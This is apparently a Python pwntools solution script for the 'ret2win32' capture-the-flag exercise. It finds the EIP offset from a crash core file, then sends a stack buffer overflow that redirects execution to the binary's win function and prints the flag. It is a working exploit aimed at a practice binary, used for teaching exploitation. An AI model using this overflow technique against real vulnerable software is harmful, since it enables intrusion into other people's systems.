#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win32_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)

    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip_value = core.eip
    eip_offset = cyclic_find(eip_value)
    info('Located EIP offset : {a}'.format(a=eip_offset))

    payload = flat(asm('nop')*eip_offset + p32(exe.symbols.ret2win))
    r = conn()
    r.sendlineafter(b'>', payload)

    r.recv()
    r.recv()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
